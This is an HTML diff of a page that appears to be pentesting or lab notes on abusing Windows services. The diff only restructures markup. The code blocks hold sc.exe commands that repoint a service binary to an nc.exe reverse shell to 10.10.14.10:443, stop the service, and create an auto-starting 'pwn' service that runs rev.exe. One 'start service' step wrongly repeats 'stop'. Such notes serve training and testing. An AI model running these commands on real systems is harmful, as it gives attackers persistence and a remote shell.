@@ -200,16 +200,20 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-change-service-path">Abuse #1: Change service path</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Change a service path (e.g. browser)</span>
 </span></span><span class="line"><span class="cl">sc.exe config browser <span class="nv">binPath</span><span class="o">=</span> <span class="s2">&#34;C:\ProgramData\nc.exe -e cmd.exe 10.10.14.10 443&#34;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stop service</span>
 </span></span><span class="line"><span class="cl">sc.exe stop browser
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start service</span>
 </span></span><span class="line"><span class="cl">sc.exe stop browser
-</span></span></code></pre></div><h3 id="additional-create-service">Additional: Create service</h3>
+</span></span></code></pre></div></div>
+<h3 id="additional-create-service">Additional: Create service</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a service</span>
 </span></span><span class="line"><span class="cl">sc.exe create pwn <span class="nv">binpath</span><span class="o">=</span> C:<span class="se">\P</span>rogramData<span class="se">\r</span>ev.exe <span class="nv">start</span><span class="o">=</span> auto
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
